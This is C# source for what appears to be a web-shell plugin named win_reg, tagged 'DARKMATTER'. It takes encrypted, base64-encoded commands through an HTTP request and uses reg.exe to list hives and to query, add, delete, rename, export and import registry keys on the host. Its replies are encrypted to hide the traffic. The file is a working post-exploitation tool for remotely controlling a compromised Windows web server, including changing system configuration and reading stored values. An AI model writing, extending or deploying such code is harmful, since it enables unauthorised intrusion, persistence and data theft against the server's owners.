using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;
using System.Text.RegularExpressions;

public class win_reg
{
    private readonly Regex PATH_PATTERN = new Regex(@"^HKEY_(LOCAL_MACHINE|CURRENT_USER|USERS|CLASSES_ROOT|CURRENT_CONFIG)\\[A-Za-z0-9_\\-]+$");
    private readonly Regex VALUE_NAME_PATTERN = new Regex(@"^[A-Za-z0-9 _\-]+$");
    private readonly Regex REG_OUTPUT_PATTERN = new Regex(@"^\s*(.*?)\s{2,}(REG_\w+)\s{2,}(.*)$");

    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam)) return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }
        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64EncodeBytes(byte[] abInput) => Convert.ToBase64String(abInput);
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));
    private byte[] fnB64DecodeBytes(string szInput) => Convert.FromBase64String(szInput);

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null) return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            
            int nDllLength = 0;
            if (context.Items["len"] != null)
            {
                int.TryParse(context.Items["len"].ToString(), out nDllLength);
            }

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();
            Dictionary<string, string> dic = fnParseParams(szParam);
            
            string szAction = fnB64Decode(dic["z0"]);
            string szJson = string.Empty;

            string[] hives = {
                "HKEY_CLASSES_ROOT",
                "HKEY_CURRENT_USER",
                "HKEY_LOCAL_MACHINE",
                "HKEY_USERS",
                "HKEY_CURRENT_CONFIG"
            };

            switch (szAction)
            {
                case "hive":
                    szJson = fnJsonEncodeMap(fnScanHives(hives));
                    break;

                case "scan":
                    szJson = fnJsonEncodeMap(fnScanRegistry(fnB64Decode(dic["z2"])));
                    break;

                case "set":
                case "new_value":
                    szJson = fnJsonEncodeMap(fnSetValue(
                        fnB64Decode(dic["z2"]),
                        fnB64Decode(dic["z3"]),
                        fnB64Decode(dic["z4"]),
                        fnB64Decode(dic["z5"])
                    ));
                    break;

                case "del_key":
                    szJson = fnJsonEncodeMap(fnDeleteKey(fnB64Decode(dic["z2"])));
                    break;

                case "del_value":
                    szJson = fnJsonEncodeMap(fnDeleteValue(
                        fnB64Decode(dic["z2"]),
                        fnB64Decode(dic["z3"])
                    ));
                    break;

                case "rename_key":
                    szJson = fnJsonEncodeMap(fnRenameKey(
                        fnB64Decode(dic["z2"]),
                        fnB64Decode(dic["z3"])
                    ));
                    break;

                case "rename_value":
                    szJson = fnJsonEncodeMap(fnRenameValue(
                        fnB64Decode(dic["z2"]),
                        fnB64Decode(dic["z3"]),
                        fnB64Decode(dic["z4"])
                    ));
                    break;

                case "new_key":
                    szJson = fnJsonEncodeMap(fnCreateKey(fnB64Decode(dic["z2"])));
                    break;

                case "export":
                    szJson = fnJsonEncodeMap(fnExportKey(fnB64Decode(dic["z2"])));
                    break;

                case "import":
                    szJson = fnJsonEncodeMap(fnImport(fnB64Decode(dic["z2"])));
                    break;

                default:
                    szJson = "{\"success\":false,\"error\":\"Unknown action\",\"subkeys\":[],\"values\":[]}";
                    break;
            }
            
            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(szJson));

            context.ApplicationInstance.CompleteRequest();
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }

    private int fnRunReg(string[] cmdArgs, List<string> output)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo("reg", string.Join(" ", cmdArgs))
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                StandardOutputEncoding = Encoding.GetEncoding(950)
            };

            using (Process p = Process.Start(psi))
            {
                string szOut = p.StandardOutput.ReadToEnd();
                string szErr = p.StandardError.ReadToEnd();
                p.WaitForExit();

                foreach (string line in szOut.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None))
                    output.Add(line);
                if (!string.IsNullOrEmpty(szErr))
                    output.Add("ERROR: " + szErr);

                return p.ExitCode;
            }
        }
        catch (Exception e)
        {
            output.Add("ERROR: " + e.Message);
            return -1;
        }
    }

    private byte[] fnRegistryValueToBytes(string value, string type)
    {
        try
        {
            switch (type)
            {
                case "REG_DWORD":
                    uint dwordNum = Convert.ToUInt32(value.Replace("0x", ""), 16);
                    return BitConverter.GetBytes(dwordNum);

                case "REG_QWORD":
                    ulong qwordNum = Convert.ToUInt64(value.Replace("0x", ""), 16);
                    return BitConverter.GetBytes(qwordNum);

                case "REG_BINARY":
                    string hex = Regex.Replace(value, "[^A-Fa-f0-9]", "");
                    byte[] rawBytes = new byte[hex.Length / 2];
                    for (int i = 0; i < rawBytes.Length; i++)
                    {
                        rawBytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
                    }
                    return rawBytes;

                default:
                    return Encoding.UTF8.GetBytes(value);
            }
        }
        catch
        {
            return new byte[0];
        }
    }

    private Dictionary<string, object> fnScanRegistry(string basePath)
    {
        var result = new Dictionary<string, object>();
        List<string> output = new List<string>();
        int ret = fnRunReg(new string[] { "query", "\"" + basePath + "\"" }, output);

        result["success"] = (ret == 0);
        result["error"] = (ret != 0) ? string.Join("\n", output) : null;
        
        List<string> subkeys = new List<string>();
        List<object> values = new List<object>();

        if (ret == 0)
        {
            bool firstKeySeen = false;
            foreach (string rawLine in output)
            {
                string line = rawLine.Trim();
                if (string.IsNullOrEmpty(line)) continue;

                if (line.StartsWith("HKEY_"))
                {
                    if (!firstKeySeen) firstKeySeen = true;
                    else subkeys.Add(line);
                    continue;
                }

                Match m = REG_OUTPUT_PATTERN.Match(line);
                if (m.Success)
                {
                    string name = m.Groups[1].Value.Trim();
                    string type = m.Groups[2].Value.Trim();
                    string valData = m.Groups[3].Value.Trim();

                    byte[] bytes = fnRegistryValueToBytes(valData, type);

                    var valMap = new Dictionary<string, object>
                    {
                        { "name", string.IsNullOrEmpty(name) ? "(Default)" : name },
                        { "type", type },
                        { "data", fnB64EncodeBytes(bytes) }
                    };
                    values.Add(valMap);
                }
            }
        }
        result["subkeys"] = subkeys;
        result["values"] = values;
        return result;
    }

    private Dictionary<string, object> fnScanHives(string[] hives)
    {
        var result = new Dictionary<string, object>();
        foreach (string hive in hives)
        {
            List<string> output = new List<string>();
            int ret = fnRunReg(new string[] { "query", "\"" + hive + "\"" }, output);
            result[hive] = (ret == 0);
        }
        return result;
    }

    private Dictionary<string, object> fnSetValue(string path, string name, string type, string data)
    {
        var result = new Dictionary<string, object>();
        var allowedTypes = new List<string> { "REG_SZ", "REG_EXPAND_SZ", "REG_DWORD", "REG_QWORD", "REG_BINARY", "REG_MULTI_SZ" };

        if (!allowedTypes.Contains(type) || !PATH_PATTERN.IsMatch(path) || (!string.IsNullOrEmpty(name) && !VALUE_NAME_PATTERN.IsMatch(name)))
        {
            result["success"] = false;
            result["error"] = "Invalid input validation";
            return result;
        }

        string formattedData = data;
        if (type == "REG_BINARY")
        {
            byte[] decoded = fnB64DecodeBytes(data);
            StringBuilder sb = new StringBuilder();
            foreach (byte b in decoded) sb.Append(b.ToString("X2"));
            formattedData = sb.ToString();
        }
        else if (type == "REG_MULTI_SZ")
        {
            formattedData = data.Replace(",", "\\0");
        }

        List<string> outList = new List<string>();
        string valArg = string.IsNullOrEmpty(name) ? "/ve" : "/v \"" + name + "\"";
        fnRunReg(new string[] { "add", "\"" + path + "\"", valArg, "/t", type, "/d", "\"" + formattedData + "\"", "/f" }, outList);

        string joinedOut = string.Join("\n", outList);
        result["success"] = !joinedOut.Contains("ERROR");
        result["output"] = outList;
        return result;
    }

    private Dictionary<string, object> fnDeleteKey(string path)
    {
        var result = new Dictionary<string, object>();
        if (!PATH_PATTERN.IsMatch(path))
        {
            result["success"] = false;
            result["error"] = "Invalid path";
            return result;
        }
        List<string> outList = new List<string>();
        int ret = fnRunReg(new string[] { "delete", "\"" + path + "\"", "/f" }, outList);
        result["success"] = (ret == 0);
        result["output"] = outList;
        return result;
    }

    private Dictionary<string, object> fnDeleteValue(string path, string name)
    {
        var result = new Dictionary<string, object>();
        if (!PATH_PATTERN.IsMatch(path) || (!string.IsNullOrEmpty(name) && !VALUE_NAME_PATTERN.IsMatch(name)))
        {
            result["success"] = false;
            result["error"] = "Invalid input";
            return result;
        }
        List<string> outList = new List<string>();
        string valArg = string.IsNullOrEmpty(name) ? "/ve" : "/v \"" + name + "\"";
        fnRunReg(new string[] { "delete", "\"" + path + "\"", valArg, "/f" }, outList);
        result["success"] = true;
        result["output"] = outList;
        return result;
    }

    private Dictionary<string, object> fnRenameValue(string path, string oldName, string newName)
    {
        var result = new Dictionary<string, object>();
        if (!PATH_PATTERN.IsMatch(path) || !VALUE_NAME_PATTERN.IsMatch(oldName) || !VALUE_NAME_PATTERN.IsMatch(newName))
        {
            result["success"] = false;
            result["error"] = "Invalid input";
            return result;
        }

        var scan = fnScanRegistry(path);
        var values = (List<object>)scan["values"];
        Dictionary<string, object> targetValue = null;

        foreach (var v in values)
        {
            var vm = (Dictionary<string, object>)v;
            if (oldName.Equals(vm["name"]))
            {
                targetValue = vm;
                break;
            }
        }

        if (targetValue == null)
        {
            result["success"] = false;
            result["error"] = "Value not found";
            return result;
        }

        string rawData = Encoding.UTF8.GetString(fnB64DecodeBytes((string)targetValue["data"])).Replace("\0", "");
        var setRes = fnSetValue(path, newName, (string)targetValue["type"], rawData);

        if (!(bool)setRes["success"]) return setRes;
        return fnDeleteValue(path, oldName);
    }

    private Dictionary<string, object> fnRenameKey(string oldPath, string newPath)
    {
        var result = new Dictionary<string, object>();
        if (!PATH_PATTERN.IsMatch(oldPath))
        {
            result["success"] = false;
            result["error"] = "Invalid source path";
            return result;
        }

        List<string> outList = new List<string>();
        fnRunReg(new string[] { "copy", "\"" + oldPath + "\"", "\"" + newPath + "\"", "/s", "/f" }, outList);
        bool ok = !string.Join("\n", outList).Contains("ERROR");

        if (!ok)
        {
            result["success"] = false;
            result["output"] = outList;
            return result;
        }

        List<string> outList2 = new List<string>();
        fnRunReg(new string[] { "delete", "\"" + oldPath + "\"", "/f" }, outList2);
        outList.AddRange(outList2);

        result["success"] = true;
        result["output"] = outList;
        return result;
    }

    private Dictionary<string, object> fnCreateKey(string path)
    {
        var result = new Dictionary<string, object>();
        if (!PATH_PATTERN.IsMatch(path))
        {
            result["success"] = false;
            result["error"] = "Invalid path";
            return result;
        }
        List<string> outList = new List<string>();
        int ret = fnRunReg(new string[] { "add", "\"" + path + "\"", "/f" }, outList);
        result["success"] = (ret == 0);
        result["output"] = outList;
        return result;
    }

    private Dictionary<string, object> fnExportKey(string path)
    {
        var result = new Dictionary<string, object>();
        if (!PATH_PATTERN.IsMatch(path))
        {
            result["success"] = false;
            result["error"] = "Invalid path";
            return result;
        }

        try
        {
            string tempFile = Path.GetTempFileName();
            List<string> outList = new List<string>();
            int ret = fnRunReg(new string[] { "export", "\"" + path + "\"", "\"" + tempFile + "\"", "/y" }, outList);

            if (ret != 0 || !File.Exists(tempFile))
            {
                result["success"] = false;
                result["output"] = outList;
                return result;
            }

            byte[] content = File.ReadAllBytes(tempFile);
            File.Delete(tempFile);

            result["success"] = true;
            result["data"] = fnB64EncodeBytes(content);
        }
        catch (Exception e)
        {
            result["success"] = false;
            result["error"] = e.Message;
        }
        return result;
    }

    private Dictionary<string, object> fnImport(string content)
    {
        var result = new Dictionary<string, object>();
        try
        {
            string tempFile = Path.Combine(Path.GetTempPath(), "reg_" + Guid.NewGuid().ToString() + ".reg");
            File.WriteAllText(tempFile, content, Encoding.UTF8);

            List<string> outList = new List<string>();
            int ret = fnRunReg(new string[] { "import", "\"" + tempFile + "\"" }, outList);
            if (File.Exists(tempFile)) File.Delete(tempFile);

            result["success"] = (ret == 0);
            result["output"] = outList;
        }
        catch (Exception e)
        {
            result["success"] = false;
            result["error"] = e.Message;
        }
        return result;
    }

    private string fnJsonEncodeMap(Dictionary<string, object> map)
    {
        StringBuilder sb = new StringBuilder();
        sb.Append("{");
        bool first = true;
        foreach (KeyValuePair<string, object> entry in map)
        {
            if (!first) sb.Append(",");
            first = false;
            sb.Append("\"").Append(entry.Key).Append("\":");
            object val = entry.Value;
            if (val is string)
            {
                sb.Append("\"").Append(val.ToString().Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n")).Append("\"");
            }
            else if (val is bool)
            {
                sb.Append(val.ToString().ToLower());
            }
            else if (val is ValueType)
            {
                sb.Append(val);
            }
            else if (val is List<string>)
            {
                sb.Append("[");
                List<string> list = (List<string>)val;
                for (int i = 0; i < list.Count; i++)
                {
                    if (i > 0)
                        sb.Append(",");

                    sb.Append("\"").Append(list[i].Replace("\\", "\\\\").Replace("\"", "\\\"")).Append("\"");
                }
                sb.Append("]");
            }
            else if (val is List<object>)
            {
                sb.Append("[");
                List<object> list = (List<object>)val;
                for (int i = 0; i < list.Count; i++)
                {
                    if (i > 0)
                        sb.Append(",");

                    if (list[i] is Dictionary<string, object>)
                    {
                        sb.Append(fnJsonEncodeMap((Dictionary<string, object>)list[i]));
                    }
                    else
                    {
                        sb.Append("\"").Append(list[i].ToString().Replace("\\", "\\\\").Replace("\"", "\\\"")).Append("\"");
                    }
                }
                sb.Append("]");
            }
            else if (val == null)
            {
                sb.Append("null");
            }
        }
        sb.Append("}");
        return sb.ToString();
    }
}